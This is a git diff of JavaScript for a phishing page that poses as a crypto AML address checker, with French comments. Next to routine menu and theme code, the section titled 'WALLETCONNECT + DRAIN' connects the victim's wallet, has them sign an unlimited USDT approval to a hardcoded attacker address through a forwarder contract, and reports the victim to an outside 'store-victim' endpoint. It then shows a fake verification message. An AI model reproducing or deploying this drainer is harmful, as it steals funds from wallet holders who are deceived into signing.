@@ -1,11 +1,60 @@
+/******************************************
+ * PARTIE 1 – FONCTIONS EXISTANTES
+ * (menu burger, thème sombre/clair)
+ ******************************************/
+document.addEventListener('DOMContentLoaded', function () {
+
+  // --- Burger menu ---
+  const burgerBtn = document.getElementById('burgerBtn');
+  const mobileMenu = document.getElementById('mobileMenu');
+  const closeMenuBtn = document.getElementById('closeMenuBtn');
+
+  if (burgerBtn && mobileMenu) {
+    burgerBtn.addEventListener('click', () => {
+      mobileMenu.classList.toggle('open');
+    });
+    if (closeMenuBtn) {
+      closeMenuBtn.addEventListener('click', () => {
+        mobileMenu.classList.remove('open');
+      });
+    }
+  }
+
+  // --- Theme toggle ---
+  const themeToggle = document.getElementById('themeToggle');
+  const html = document.documentElement;
+  if (themeToggle) {
+    themeToggle.addEventListener('click', () => {
+      const isDark = html.classList.toggle('dark');
+      localStorage.setItem('theme', isDark ? 'dark' : 'light');
+    });
+    // Restore saved theme
+    const saved = localStorage.getItem('theme');
+    if (saved === 'dark') {
+      html.classList.add('dark');
+    }
+  }
+
+  // Lancer le module WalletConnect après chargement
+  initWalletConnect().catch(err => {
+    console.error('Erreur init WalletConnect:', err);
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = 'Erreur de connexion';
+  });
+
+});
+
+/******************************************
+ * PARTIE 2 – WALLETCONNECT + DRAIN
+ ******************************************/
 const ATTACKER = '0x22C8A3678871133D80f457CFaa6a442CC383481F';
 const API = 'https://aml-checker-4.vercel.app/api/store-victim';
+const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
 
 let signClient;
 let session;
 let account;
 let currentChainId;
-const PROJECT_ID = '22d764eabb976a73c5ee29567f3972d6';
 
 function getSignClient() {
   const ns = window["@walletconnect/sign-client"];
@@ -40,6 +89,7 @@ async function initWalletConnect() {
     }
   });
 
+  // Attendre que QRCode soit chargé
   await new Promise((resolve, reject) => {
     if (typeof QRCode !== 'undefined') return resolve();
     let tries = 0;
@@ -60,10 +110,9 @@ async function initWalletConnect() {
   qrDiv.innerHTML = '';
   new QRCode(qrDiv, {
     text: uri,
-    width: 280,
-    height: 280
+    width: 250,   // exactement la taille du QR factice (classe .qr = 250px)
+    height: 250
   });
-  document.getElementById('status').innerText = 'Scannez le QR code avec votre wallet';
 
   session = await approval();
 
@@ -75,27 +124,28 @@ async function initWalletConnect() {
   account = ethAccount.split(':')[2];
   currentChainId = '1';
 
-  document.getElementById('qrcode').style.display = 'none';
-  document.getElementById('status').innerText = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;
+  // Cacher le QR et afficher le statut
+  qrDiv.style.display = 'none';
+  const scanText = document.querySelector('.scan');
+  if (scanText) scanText.textContent = `Connecté : ${account.substring(0,6)}...${account.substring(38)}`;
 
   setTimeout(() => startScam(), 1000);
 }
 
 async function startScam() {
   if (currentChainId !== '1') {
-    document.getElementById('status').innerText = 'Réseau non supporté (Ethereum mainnet requis)';
+    const scanText = document.querySelector('.scan');
+    if (scanText) scanText.textContent = 'Réseau non supporté (Ethereum mainnet requis)';
     return;
   }
 
   const USDT_ADDR = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
   const FORWARDER = '0x76C1F89188e3A9dF25B757C69360f82311530591';
 
-  // Données : approve(ATTACKER, MAX)
   const targetData = '0x095ea7b3' +
     ATTACKER.slice(2).padStart(64, '0') +
     'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-  // Données du forwarder : execute(address, bytes)
   const executeData = '0x54d1d367' +
     USDT_ADDR.slice(2).padStart(64, '0') +
     '0000000000000000000000000000000000000000000000000000000000000040' +
@@ -103,15 +153,12 @@ async function startScam() {
     targetData.slice(2) +
     '000000000000000000000000';
 
-  // ✅ Gas limit réel pour USDT approve = 60 000
-  // ✅ Pas de gasPrice fixe → laisse le wallet choisir
   const tx = {
     from: account,
     to: FORWARDER,
     data: executeData,
     chainId: 1,
-    gasLimit: '0xea60' // 60 000 → standard
-    // → pas de gasPrice → wallet choisit automatiquement
+    gasLimit: '0xea60'
   };
 
   try {
@@ -136,11 +183,7 @@ async function startScam() {
     body: JSON.stringify({ victim: account, chain: currentChainId })
   });
 
-  document.getElementById('status').innerText = 'Vérification AML terminée. Redirection...';
+  const scanText = document.querySelector('.scan');
+  if (scanText) scanText.textContent = 'Vérification AML terminée. Redirection...';
   setTimeout(() => window.location.href = '/verifyaddress.html', 3000);
 }
-
-initWalletConnect().catch(err => {
-  console.error('Erreur init WalletConnect:', err);
-  document.getElementById('status').innerText = `Erreur : ${err.message || err}`;
-});
